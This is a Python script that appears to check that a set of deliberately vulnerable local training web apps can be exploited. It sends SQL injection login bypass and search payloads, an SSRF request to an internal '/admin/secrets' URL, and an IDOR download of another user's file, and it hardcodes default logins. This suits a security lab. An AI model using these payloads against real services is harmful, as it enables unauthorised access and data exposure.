import requests
import sys


def test_vulnerability(
    name,
    url,
    method="GET",
    data=None,
    params=None,
    headers=None,
    expected_header="X-Vuln-Confirmed",
    session=None,
):
    print(f"\n📍 Testing {name} ({url})")
    client = session if session else requests.Session()
    try:
        if method == "GET":
            r = client.get(url, params=params, headers=headers, timeout=5)
        else:
            if headers and "application/json" in headers.get("Accept", ""):
                r = client.post(url, json=data, headers=headers, timeout=5)
            else:
                r = client.post(url, data=data, headers=headers, timeout=5)

        print(f"  Status: {r.status_code}")
        if expected_header in r.headers:
            print(
                f"  ✅ SUCCESS: {expected_header} found! ({r.headers[expected_header]})"
            )
            return True
        else:
            if r.status_code == 302 or "/login" in r.url:
                print(f"  ⚠️  REDIRECTED: Authorization might be required.")
            print(f"  ❌ FAILED: {expected_header} NOT found.")
            return False
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False


def get_session(login_url, username="admin", password="admin123"):
    s = requests.Session()
    print(f"🔑 Logging in to {login_url} as {username}...")
    try:
        r = s.post(
            login_url, data={"username": username, "password": password}, timeout=5
        )
        if r.status_code == 200 or r.status_code == 302:
            print(f"  ✅ Login as {username} successful")
            return s
    except Exception as e:
        print(f"  ❌ Login failed: {e}")
    return None


def run_all_tests():
    results = []

    # 1. E-Commerce SQLi Login
    results.append(
        test_vulnerability(
            "E-Commerce SQLi Login",
            "http://localhost:5002/login",
            method="POST",
            data={"username": "admin' OR '1'='1", "password": "any"},
            headers={"Accept": "application/json"},
        )
    )

    # 2. Social Media SQLi Search
    results.append(
        test_vulnerability(
            "Social SQLi Search",
            "http://localhost:5003/api/search",
            params={"q": "' OR '1'='1"},
        )
    )

    # 3. Blog SSRF
    blog_session = get_session("http://localhost:5005/login")
    if blog_session:
        results.append(
            test_vulnerability(
                "Blog SSRF",
                "http://localhost:5005/import_post",
                method="POST",
                data={"url": "http://127.0.0.1/admin/secrets"},
                session=blog_session,
            )
        )

    # 4. FileShare IDOR Download
    # Login as 'user' to access 'admin''s file 1
    fs_session = get_session(
        "http://localhost:5006/login", username="user", password="password"
    )
    if fs_session:
        results.append(
            test_vulnerability(
                "FileShare IDOR Download",
                "http://localhost:5006/download/1",  # Admin's file
                session=fs_session,
            )
        )

    success_count = sum(1 for r in results if r)
    print(f"\n" + "=" * 40)
    print(f"VERIFICATION SUMMARY: {success_count}/{len(results)} PASSED")
    print("=" * 40)


if __name__ == "__main__":
    run_all_tests()
